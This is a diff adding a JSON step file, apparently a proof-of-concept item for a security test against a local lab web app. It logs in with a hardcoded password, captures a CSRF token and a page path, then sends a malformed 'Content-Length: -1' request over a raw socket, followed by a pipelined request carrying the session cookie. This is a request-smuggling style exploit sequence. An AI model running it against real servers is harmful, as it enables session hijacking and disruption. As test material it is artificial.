@@ -1,0 +1,61 @@
+{
+  "schema_version": 1,
+  "steps": [
+    {
+      "op": "http",
+      "method": "GET",
+      "path": "/auth/login/",
+      "headers": {},
+      "form": {},
+      "captures": [
+        {
+          "name": "csrf",
+          "source": "body",
+          "pattern": "name=\"csrfmiddlewaretoken\" value=\"([^\"]+)\""
+        }
+      ]
+    },
+    {
+      "op": "http",
+      "method": "POST",
+      "path": "/auth/login/",
+      "headers": {},
+      "form": {
+        "username": "operator",
+        "password": "LedgerLab987!",
+        "csrfmiddlewaretoken": "{{var:csrf}}"
+      },
+      "captures": []
+    },
+    {
+      "op": "http",
+      "method": "GET",
+      "path": "/work/",
+      "headers": {},
+      "form": {},
+      "captures": [
+        {
+          "name": "post_path",
+          "source": "body",
+          "pattern": "class=\"review-entry\" href=\"([^\"]+)\""
+        }
+      ]
+    },
+    {
+      "op": "raw_socket",
+      "sends": [
+        {
+          "text": "GET /bad HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: -1\r\n\r\n",
+          "delay_ms": 0
+        },
+        {
+          "text": "GET {{var:post_path}} HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: sessionid={{cookie:sessionid}}\r\n\r\n",
+          "delay_ms": 10
+        }
+      ],
+      "read_timeout_ms": 1000,
+      "captures": []
+    }
+  ],
+  "diagnostic": null
+}
